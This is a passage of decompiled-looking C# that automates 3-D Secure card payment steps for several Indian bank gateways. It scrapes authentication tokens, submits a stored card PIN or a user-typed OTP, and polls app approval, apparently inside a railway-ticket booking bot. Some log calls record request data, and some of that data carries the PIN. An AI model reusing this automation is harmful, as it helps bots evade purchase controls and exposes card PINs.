                        clsMain.Lock("3rd Hit Inp = " + string_94);
                        if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                        {
                            clsMain.Lock("3rd Hit output = " + string_97);
                            text9 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                            value4 = text9.Substring(0, text9.IndexOf("\""));
                            value4 = WebUtility.UrlEncode(value4);
                            value4 = value4.Replace("!", "%21");
                            string_94 = string.Concat(new string[3] { "colorDepth=24&screenWidth=1920&screenHeight=1080&timezoneOffsetInMinutes=-330&javaEnabled=false&org.apache.myfaces.trinidad.faces.FORM=info&_noJavaScript=false&javax.faces.ViewState=", value4, "&source=submitButton" });
                            string_92 = string_93;
                            string_93 = string_93.Replace("e1s2", "e1s3");
                            string text11 = "https://secure.axisbank.com/acs-web-axis/EnrollWeb/AxisBank/server/AccessControlServer";
                            updateTStatus_1.BeginInvoke(1, string_88 + "_Getway Int{ 7/4 }", tCntrlName_, null, null);
                            clsMain.Lock("4th Hit Inp = " + string_94);
                            if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                            {
                                string_92 = string_93;
                                if (string_97.Contains("TermUrl"))
                                {
                                    updateTStatus_1.BeginInvoke(1, string_88 + "_Getway Int{ 7/5 }", tCntrlName_, null, null);
                                    string_94 = class3_0.Method_SerialInp(string_97, ref string_93, false);
                                    //text9 = string_97.Substring(string_97.IndexOf("PaReq") + 14);
                                    string text12 = "";
                                    if (string_88.Contains("NSDL"))
                                    {
                                        text9 = string_97.Substring(string_97.IndexOf("name=\"PaReq\"") + 20);
                                        text12 = text9.Substring(0, text9.IndexOf("\">"));
                                    }
                                    else
                                    {
                                        text9 = string_97.Substring(string_97.IndexOf("PaReq") + 14);
                                        text12 = text9.Substring(0, text9.IndexOf("\""));
                                    }

                                    text9 = string_97.Substring(string_97.IndexOf("name=\"MD") + 17);
                                    string text13 = text9.Substring(0, text9.IndexOf("\""));
                                    text9 = string_97.Substring(string_97.IndexOf("name=\"TermUrl") + 22);
                                    string text14 = text9.Substring(0, text9.IndexOf("\""));
                                    text14 = text14.Replace("amp;", "");
                                    if (text13.Contains("_______"))
                                    {
                                        text12 = WebUtility.UrlEncode(text12);
                                        text12 = text12.Replace("%0A", "%0D%0A");
                                        string_94 = "PaReq=" + text12 + "&TermUrl=" + WebUtility.UrlEncode(text14) + "&MD=" + WebUtility.UrlEncode(text13);
                                    }
                                    else
                                    {
                                        string_94 = "MD=" + text13 + "&PaReq=" + HttpUtility.UrlEncode(text12) + "&TermUrl=" + WebUtility.UrlEncode(text14);
                                    }
                                    bool_51 = true;
                                    string_92 = string_93;
                                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0) && string_97.IndexOf("PayZapp secure PIN") > 0)
                                    {
                                        string_92 = string_93;
                                        string_94 = class3_0.Method_SerialInp(string_97, ref string_93, false);
                                        string_94 = clsPostData.SetPost(string_94, "txtPassword", array[3]);
                                        string text15 = string_97.Substring(string_97.IndexOf("XID") + 12);
                                        string value5 = text15.Substring(0, text15.IndexOf("\""));
                                        string_94 = "XID=" + WebUtility.UrlEncode(value5) + "&txtLogin=-1&txtPassword=" + array[3] + "&xdeviceId=&bTz=";
                                        string_93 = "https://hdfc-acs.wibmo.com" + string_93;
                                        updateTStatus_1.BeginInvoke(1, string_88 + "_Getway Int{ 7/6 }", tCntrlName_, null, null);
                                        bool_51 = true;
                                        if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                        {
                                            clsMain.Lock("5th Hit output = " + string_97);
                                            if (string_97.IndexOf("Authentication failed") > 0)
                                            {
                                                if (updateTStatus_1 != null)
                                                {
                                                    updateTStatus_1.BeginInvoke(1, "Invalid PIN", tCntrlName_, null, null);
                                                }
                                                return false;
                                            }
                                            string_92 = string_93;
                                            string_94 = class3_0.Method_SerialInp(string_97, ref string_93, true);
                                            text9 = string_97.Substring(string_97.IndexOf("PaRes") + 14);
                                            string value6 = text9.Substring(0, text9.IndexOf("\""));
                                            text9 = string_97.Substring(string_97.IndexOf("name=\"MD") + 17);
                                            string value7 = text9.Substring(0, text9.IndexOf("\""));
                                            string_94 = "MD=" + WebUtility.UrlEncode(value7) + "&PaRes=" + WebUtility.UrlEncode(value6);
                                            updateTStatus_1.BeginInvoke(1, string_88 + "_Getway Int { 7/7 }", tCntrlName_, null, null);
                                            clsMain.Lock("6th Hit Inp = " + string_94);
                                            if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                            {
                                                clsMain.Lock("6th Hit output = " + string_97);
                                                Reffral = string_93;
                                                string_90 = string_97;
                                                return true;
                                            }
                                            clsMain.Lock("First Hit Failed. err = " + string_96);
                                            string_91 = "Failed while making Payment.";
                                            bool flag = false;//We have sent you a text message with an OTP code to your registered mobile number ending with 
                                        }
                                    }
                                    else if (string_97.Contains("Notification sent to PayZapp"))
                                    {

                                        updateTStatus_1.BeginInvoke(1, "Slide from PAYZAP app..", tCntrlName_, null, null);
                                        string authenticateid = string_97.Substring(string_97.IndexOf("auth-context-id") + 24);
                                        authenticateid = authenticateid.Substring(0, authenticateid.IndexOf("\" />"));
                                        Thread.Sleep(2000);
                                    ILpayzapp:
                                        Thread.Sleep(500);
                                        string_93 = "https://api.tachyon.hdfcbank.com/cipher3ds/edith/v1.0/tenants/1/authenticate/getStatus?authContextId=" + authenticateid;
                                        _Request(string_93, null, "https://api.tachyon.hdfcbank.com/cipher3ds/visacipher/visacipher/pareq", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);
                                        //try
                                        //{
                                        //    string contents = string_93 + "\n\n\n\n" + string_93 + "\n\n\n\n" + postdata + "\n\n\n\n" + string_97;
                                        //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP1" + DateTime.Now.ToString("hhmmssfff");
                                        //    File.WriteAllText(path3hh, contents);
                                        //}
                                        //catch
                                        //{

                                        //}
                                        if (string_97.Contains("PENDING"))
                                        {
                                            goto ILpayzapp;
                                        }
                                        string_97 = DecodeEncodedNonAsciiCharacters(string_97);

                                        string text9DE = string_97.Substring(string_97.IndexOf("redirect-form") + 25);
                                        string value6DE = text9DE.Substring(0, text9DE.IndexOf("\""));
                                        value6DE = value6DE.Replace("\\", "");
                                        //value6DE = value6DE.Replace("u0026", "&");
                                        //value6DE = value6DE.Replace("\\", "");
                                        string text9D = string_97.Substring(string_97.IndexOf("PaRes") + 32);
                                        string value6D = text9D.Substring(0, text9D.IndexOf("\""));
                                        value6D = value6D.Replace("\\", "");
                                        text9D = string_97.Substring(string_97.IndexOf("\"MD") + 30);
                                        string value7D = text9D.Substring(0, text9D.IndexOf("\""));
                                        value7D = value7D.Replace("\\", "");
                                        string_94 = "PaRes=" + HttpUtility.UrlEncode(value6D) + "&MD=" + WebUtility.UrlEncode(value7D);
                                        if (_Request(value6DE, string_94, "https://api.tachyon.hdfcbank.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                        {
                                            //try
                                            //{
                                            //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                            //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                            //    File.WriteAllText(path3hh, contents);
                                            //}
                                            //catch
                                            //{

                                            //}
                                            //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                            //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                            //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                            //class3_0.payzappDATA = ENCDATA;
                                            clsMain.Lock("6th Hit output = " + string_97);
                                            Reffral = string_93;
                                            string_90 = string_97;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_96);
                                        string_91 = "Failed while making Payment.";
                                        bool flag = false;
                                    }
                                    else if (string_97.Contains("We have sent you a text message with an OTP code to your registered mobile number ending with"))
                                    {

                                        string acctid = string_97.Substring(string_97.IndexOf("acctId") + 15);
                                        acctid = acctid.Substring(0, acctid.IndexOf("\">"));
                                        string_93 = string_97.Substring(string_97.IndexOf("(\"Login\").action") + 20);
                                        string_93 = string_93.Substring(0, string_93.IndexOf("\";"));
                                    reotp:
                                        string text36OTP = "";
                                        frmOTP frmOTP = new frmOTP();
                                        frmOTP.method_1AxisDc(clsMain.control_0, clsMain.rectangle_0, true, "Axis Bank OTP", class3_0.BANKSAVEAS);
                                        if (frmOTP.DialogResult == DialogResult.Cancel)
                                        {
                                            frmOTP.Dispose();
                                            return false;
                                        }
                                        text36OTP = frmOTP.string_0;
                                        frmOTP.Dispose();
                                        string_94 = "otpValue=" + text36OTP + "&formReqType=Submit&acctId=" + acctid;
                                        // string_93 = "https://api.tachyon.hdfcbank.com/cipher3ds/edith/v1.0/tenants/1/authenticate/getStatus?authContextId=" + authenticateid;
                                        _Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);

                                        if (string_97.Contains("The OTP code you entered is incorrect please try again."))
                                        {
                                            goto reotp;
                                        }

                                        string frmMerchantPost = string_97.Substring(string_97.IndexOf("id=\"frmMerchantPost") + 43);
                                        frmMerchantPost = frmMerchantPost.Substring(0, frmMerchantPost.IndexOf("\">"));
                                        frmMerchantPost = frmMerchantPost.Replace("amp;", "");
                                        string MDD = string_97.Substring(string_97.IndexOf("=\"MD\" value=\"") + 13);
                                        MDD = MDD.Substring(0, MDD.IndexOf("\">"));
                                        string text9D = string_97.Substring(string_97.IndexOf("PaRes") + 14);
                                        text9D = text9D.Substring(0, text9D.IndexOf("\">"));
                                        string_94 = "PaRes=" + HttpUtility.UrlEncode(text9D) + "&MD=" + WebUtility.UrlEncode(MDD);
                                        if (_Request(frmMerchantPost, string_94, "https://secureaxis-acs2ui-b1-indblr-blrtdc.axisbank.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                        {
                                            //string text9DE = string_97.Substring(string_97.IndexOf("form id=\"redirectForm") + 51);
                                            //string value6DE = text9DE.Substring(0, text9DE.IndexOf("\""));
                                            //text9D = string_97.Substring(string_97.IndexOf("PaReq") + 14);
                                            //string value6D = text9D.Substring(0, text9D.IndexOf("\">"));
                                            ////value6D = value6D.Replace("\\", "");
                                            //text9D = string_97.Substring(string_97.IndexOf("name=\"MD") + 17);
                                            //string value7D = text9D.Substring(0, text9D.IndexOf("\">"));
                                            ////value7D = value7D.Replace("\\", "");
                                            //string_94 = "PaReq=" + HttpUtility.UrlEncode(value6D) + "&MD=" + WebUtility.UrlEncode(MDD);
                                            //if (_Request(value6DE, string_94, "https://secureaxis-acs2ui-b1-indblr-blrtdc.axisbank.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                            {
                                                //try
                                                //{
                                                //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                                //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                                //    File.WriteAllText(path3hh, contents);
                                                //}
                                                //catch
                                                //{

                                                //}
                                                //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                                //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                                //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                                //class3_0.payzappDATA = ENCDATA;
                                                clsMain.Lock("6th Hit output = " + string_97);
                                                Reffral = string_93;
                                                string_90 = string_97;
                                                return true;
                                            }

                                            //try
                                            //{
                                            //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                            //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                            //    File.WriteAllText(path3hh, contents);
                                            //}
                                            //catch
                                            //{

                                            //}
                                            //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                            //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                            //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                            //class3_0.payzappDATA = ENCDATA;
                                            clsMain.Lock("6th Hit output = " + string_97);
                                            Reffral = string_93;
                                            string_90 = string_97;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_96);
                                        string_91 = "Failed while making Payment.";
                                        bool flag = false;
                                    }
                                    else if (string_97.Contains("OTP successfully sent to your registered mobile number and email id"))
                                    {

                                        string acctid = string_97.Substring(string_97.IndexOf("acctId") + 15);
                                        acctid = acctid.Substring(0, acctid.IndexOf("\">"));
                                        string_93 = string_97.Substring(string_97.IndexOf("authPasswordSet2\").action") + 29);
                                        string_93 = string_93.Substring(0, string_93.IndexOf("\";"));
                                    reotp:
                                        string text36OTP = "";
                                        frmOTP frmOTP = new frmOTP();
                                        frmOTP.method_1PaytmDc(clsMain.control_0, clsMain.rectangle_0, true, "Paytm Bank OTP", class3_0.BANKSAVEAS);
                                        if (frmOTP.DialogResult == DialogResult.Cancel)
                                        {
                                            frmOTP.Dispose();
                                            return false;
                                        }
                                        text36OTP = frmOTP.string_0;
                                        frmOTP.Dispose();
                                        string_94 = "otpValue=" + text36OTP + "&formReqType=Submit&acctId=" + acctid;
                                        // string_93 = "https://api.tachyon.hdfcbank.com/cipher3ds/edith/v1.0/tenants/1/authenticate/getStatus?authContextId=" + authenticateid;
                                        _Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);

                                        if (string_97.Contains("The OTP code you entered is incorrect please try again."))
                                        {
                                            goto reotp;
                                        }

                                        string frmMerchantPost = string_97.Substring(string_97.IndexOf("id=\"frmMerchantPost") + 43);
                                        frmMerchantPost = frmMerchantPost.Substring(0, frmMerchantPost.IndexOf("\">"));
                                        frmMerchantPost = frmMerchantPost.Replace("amp;", "");
                                        string MDD = string_97.Substring(string_97.IndexOf("=\"MD\" value=\"") + 13);
                                        MDD = MDD.Substring(0, MDD.IndexOf("\">"));
                                        string text9D = string_97.Substring(string_97.IndexOf("PaRes") + 14);
                                        text9D = text9D.Substring(0, text9D.IndexOf("\">"));
                                        string_94 = "PaRes=" + HttpUtility.UrlEncode(text9D) + "&MD=" + WebUtility.UrlEncode(MDD);
                                        if (_Request(frmMerchantPost, string_94, "https://secure-acs2ui-bk2-indmum-mumrdc.wibmo.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                        {
                                            //string text9DE = string_97.Substring(string_97.IndexOf("form id=\"redirectForm") + 51);
                                            //string value6DE = text9DE.Substring(0, text9DE.IndexOf("\""));
                                            //text9D = string_97.Substring(string_97.IndexOf("PaReq") + 14);
                                            //string value6D = text9D.Substring(0, text9D.IndexOf("\">"));
                                            ////value6D = value6D.Replace("\\", "");
                                            //text9D = string_97.Substring(string_97.IndexOf("name=\"MD") + 17);
                                            //string value7D = text9D.Substring(0, text9D.IndexOf("\">"));
                                            ////value7D = value7D.Replace("\\", "");
                                            //string_94 = "PaReq=" + HttpUtility.UrlEncode(value6D) + "&MD=" + WebUtility.UrlEncode(MDD);
                                            //if (_Request(value6DE, string_94, "https://secureaxis-acs2ui-b1-indblr-blrtdc.axisbank.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                            {
                                                //try
                                                //{
                                                //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                                //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                                //    File.WriteAllText(path3hh, contents);
                                                //}
                                                //catch
                                                //{

                                                //}
                                                //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                                //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                                //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                                //class3_0.payzappDATA = ENCDATA;
                                                clsMain.Lock("6th Hit output = " + string_97);
                                                Reffral = string_93;
                                                string_90 = string_97;
                                                return true;
                                            }

                                            //try
                                            //{
                                            //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                            //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                            //    File.WriteAllText(path3hh, contents);
                                            //}
                                            //catch
                                            //{

                                            //}
                                            //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                            //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                            //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                            //class3_0.payzappDATA = ENCDATA;
                                            clsMain.Lock("6th Hit output = " + string_97);
                                            Reffral = string_93;
                                            string_90 = string_97;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_96);
                                        string_91 = "Failed while making Payment.";
                                        bool flag = false;
                                    }
                                    else if (string_97.Contains("An OTP (One Time Password) has been sent to your registered mobile number. Please authenticate the transaction using this OTP"))
                                    {

                                        string frmMerchantPost = string_97.Substring(string_97.IndexOf("id=\"frmPayerAuth") + 40);
                                        frmMerchantPost = frmMerchantPost.Substring(0, frmMerchantPost.IndexOf("\" onSubmit="));
                                        frmMerchantPost = "https://acs1.icicibank.com" + frmMerchantPost;
                                    reotp:
                                        string text36OTP = "";
                                        frmOTP frmOTP = new frmOTP();
                                        frmOTP.method_1ICICDC(clsMain.control_0, clsMain.rectangle_0, true, "Paytm Bank OTP", class3_0.BANKSAVEAS);
                                        if (frmOTP.DialogResult == DialogResult.Cancel)
                                        {
                                            frmOTP.Dispose();
                                            return false;
                                        }
                                        text36OTP = frmOTP.string_0;
                                        frmOTP.Dispose();
                                        string_94 = "txtLogin=13350404&txtAutoOtp=" + text36OTP + "&otpResendRequestFrom=%2Fauth%2FVBV.jsp&cmdSubmit=Submit";
                                        // string_93 = "https://api.tachyon.hdfcbank.com/cipher3ds/edith/v1.0/tenants/1/authenticate/getStatus?authContextId=" + authenticateid;
                                        _Request(frmMerchantPost, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);
                                        string_93 = string_92;
                                        if (string_97.Contains("Invalid Credentials. Please try again"))
                                        {
                                            goto reotp;
                                        }

                                        frmMerchantPost = string_97.Substring(string_97.IndexOf("id=\"frmMerchantPost") + 43);
                                        frmMerchantPost = frmMerchantPost.Substring(0, frmMerchantPost.IndexOf("\">"));
                                        frmMerchantPost = frmMerchantPost.Replace("amp;", "");
                                        string MDD = string_97.Substring(string_97.IndexOf("=\"MD\" value=\"") + 13);
                                        MDD = MDD.Substring(0, MDD.IndexOf("\">"));
                                        string text9D = string_97.Substring(string_97.IndexOf("PaRes") + 14);
                                        text9D = text9D.Substring(0, text9D.IndexOf("\">"));
                                        string_94 = "PaRes=" + HttpUtility.UrlEncode(text9D) + "&MD=" + WebUtility.UrlEncode(MDD);
                                        if (_Request(frmMerchantPost, string_94, "https://acs1.icicibank.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                        {
                                            //string text9DE = string_97.Substring(string_97.IndexOf("form id=\"redirectForm") + 51);
                                            //string value6DE = text9DE.Substring(0, text9DE.IndexOf("\""));
                                            //text9D = string_97.Substring(string_97.IndexOf("PaReq") + 14);
                                            //string value6D = text9D.Substring(0, text9D.IndexOf("\">"));
                                            ////value6D = value6D.Replace("\\", "");
                                            //text9D = string_97.Substring(string_97.IndexOf("name=\"MD") + 17);
                                            //string value7D = text9D.Substring(0, text9D.IndexOf("\">"));
                                            ////value7D = value7D.Replace("\\", "");
                                            //string_94 = "PaReq=" + HttpUtility.UrlEncode(value6D) + "&MD=" + WebUtility.UrlEncode(MDD);
                                            //if (_Request(value6DE, string_94, "https://secureaxis-acs2ui-b1-indblr-blrtdc.axisbank.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                            {
                                                //try
                                                //{
                                                //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                                //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                                //    File.WriteAllText(path3hh, contents);
                                                //}
                                                //catch
                                                //{

                                                //}
                                                //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                                //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                                //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                                //class3_0.payzappDATA = ENCDATA;
                                                clsMain.Lock("6th Hit output = " + string_97);
                                                Reffral = string_93;
                                                string_90 = string_97;
                                                return true;
                                            }

                                            //try
                                            //{
                                            //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                            //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                            //    File.WriteAllText(path3hh, contents);
                                            //}
                                            //catch
                                            //{

                                            //}
                                            //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                            //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                            //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                            //class3_0.payzappDATA = ENCDATA;
                                            clsMain.Lock("6th Hit output = " + string_97);
                                            Reffral = string_93;
                                            string_90 = string_97;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_96);
                                        string_91 = "Failed while making Payment.";
                                        bool flag = false;
                                    }
                                    else if (string_97.Contains("Please use the IPIN to authenticate the transaction") || string_88.Contains("NSDL_DC"))
                                    {

                                        //    string acctid = string_97.Substring(string_97.IndexOf("acctId") + 15);
                                        //    acctid = acctid.Substring(0, acctid.IndexOf("\">"));
                                        //    string_93 = string_97.Substring(string_97.IndexOf("(\"Login\").action") + 20);
                                        string_93 = "https://isg-3dsecure.in/GeniusVACS-NSDL/validateIPIN.action";
                                        //reotp:
                                        string text36OTP = array[3];
                                        //    frmOTP frmOTP = new frmOTP();
                                        //    frmOTP.method_1AxisDc(clsMain.control_0, clsMain.rectangle_0, true, "Axis Bank OTP", class3_0.BANKSAVEAS);
                                        //    if (frmOTP.DialogResult == DialogResult.Cancel)
                                        //    {
                                        //        frmOTP.Dispose();
                                        //        return false;
                                        //    }
                                        //    text36OTP = frmOTP.string_0;
                                        //    frmOTP.Dispose();
                                        string_94 = "pwd=" + text36OTP;
                                        // string_93 = "https://api.tachyon.hdfcbank.com/cipher3ds/edith/v1.0/tenants/1/authenticate/getStatus?authContextId=" + authenticateid;
                                        _Request(string_93, string_94, "https://isg-3dsecure.in/GeniusVACS-NSDL/PaRequestHandler", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);

                                        //payment confirm
                                        //_Request("https://isg-3dsecure.in/GeniusVACS-NSDL/processPaRequest.action", null, "https://isg-3dsecure.in/GeniusVACS-NSDL/PaRequestHandler", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);
                                        string frmMerchantPost = string_97.Substring(string_97.IndexOf("PaRes") + 14);
                                        frmMerchantPost = frmMerchantPost.Substring(0, frmMerchantPost.IndexOf("\"/>"));
                                        //frmMerchantPost = frmMerchantPost.Replace("amp;", "");
                                        string MDD = string_97.Substring(string_97.IndexOf("=\"MD\" value=\"") + 13);
                                        MDD = MDD.Substring(0, MDD.IndexOf("\" />"));
                                        //.ToString(CultureInfo.InvariantCulture));
                                        string nsdl = class3_0.Method_SerialInp(string_97, ref url, false);
                                        string_94 = "PaRes=" + HttpUtility.UrlEncode(frmMerchantPost) + "&MD=" + WebUtility.UrlEncode(MDD);
                                        if (_Request(url, string_94, "https://isg-3dsecure.in/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                        {
                                            //string text9DE = string_97.Substring(string_97.IndexOf("form id=\"redirectForm") + 51);
                                            //string value6DE = text9DE.Substring(0, text9DE.IndexOf("\""));
                                            //text9D = string_97.Substring(string_97.IndexOf("PaReq") + 14);
                                            //string value6D = text9D.Substring(0, text9D.IndexOf("\">"));
                                            ////value6D = value6D.Replace("\\", "");
                                            //text9D = string_97.Substring(string_97.IndexOf("name=\"MD") + 17);
                                            //string value7D = text9D.Substring(0, text9D.IndexOf("\">"));
                                            ////value7D = value7D.Replace("\\", "");
                                            //string_94 = "PaReq=" + HttpUtility.UrlEncode(value6D) + "&MD=" + WebUtility.UrlEncode(MDD);
                                            //if (_Request(value6DE, string_94, "https://secureaxis-acs2ui-b1-indblr-blrtdc.axisbank.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                            {
                                                //try
                                                //{
                                                //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                                //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                                //    File.WriteAllText(path3hh, contents);
                                                //}
                                                //catch
                                                //{

                                                //}
                                                //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                                //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                                //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                                //class3_0.payzappDATA = ENCDATA;
                                                clsMain.Lock("6th Hit output = " + string_97);
                                                Reffral = string_93;
                                                string_90 = string_97;
                                                return true;
                                            }

                                            //try
                                            //{
                                            //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                            //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                            //    File.WriteAllText(path3hh, contents);
                                            //}
                                            //catch
                                            //{

                                            //}
                                            //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                            //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                            //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                            //class3_0.payzappDATA = ENCDATA;
                                            clsMain.Lock("6th Hit output = " + string_97);
                                            Reffral = string_93;
                                            string_90 = string_97;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_96);
                                        string_91 = "Failed while making Payment.";
                                        bool flag = false;
                                    }
                                    else if (string_97.Contains("Please enter your secure code in order to complete your transaction. This information will not be shared with"))
                                    {
                                        string_92 = string_93;
                                        string acctid = string_97.Substring(string_97.IndexOf("acctId") + 15);
                                        acctid = acctid.Substring(0, acctid.IndexOf("\">"));
                                        string_93 = string_97.Substring(string_97.IndexOf("(\"Login\").action") + 20);
                                        string_93 = string_93.Substring(0, string_93.IndexOf("\";"));
                                    reotp:
                                        string text36OTP = "";
                                        frmOTP frmOTP = new frmOTP();
                                        frmOTP.method_1AIRTELDC(clsMain.control_0, clsMain.rectangle_0, true, "Airtel Card Otp", class3_0.BANKSAVEAS);
                                        if (frmOTP.DialogResult == DialogResult.Cancel)
                                        {
                                            frmOTP.Dispose();
                                            return false;
                                        }
                                        text36OTP = frmOTP.string_0;
                                        frmOTP.Dispose();
                                        string_94 = "otpValue=" + text36OTP + "&formReqType=Submit&acctId=" + acctid + "&disableResendBtn=";
                                        // string_93 = "https://api.tachyon.hdfcbank.com/cipher3ds/edith/v1.0/tenants/1/authenticate/getStatus?authContextId=" + authenticateid;
                                        _Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);

                                        if (string_97.Contains("Invalid OTP or SecureCode"))
                                        {
                                            goto reotp;
                                        }

                                        string frmMerchantPost = string_97.Substring(string_97.IndexOf("id=\"frmMerchantPost") + 43);
                                        frmMerchantPost = frmMerchantPost.Substring(0, frmMerchantPost.IndexOf("\">"));
                                        frmMerchantPost = frmMerchantPost.Replace("amp;", "");
                                        string MDD = string_97.Substring(string_97.IndexOf("=\"MD\" value=\"") + 13);
                                        MDD = MDD.Substring(0, MDD.IndexOf("\">"));
                                        string text9D = string_97.Substring(string_97.IndexOf("PaRes") + 14);
                                        text9D = text9D.Substring(0, text9D.IndexOf("\">"));
                                        string_94 = "PaRes=" + HttpUtility.UrlEncode(text9D) + "&MD=" + WebUtility.UrlEncode(MDD);
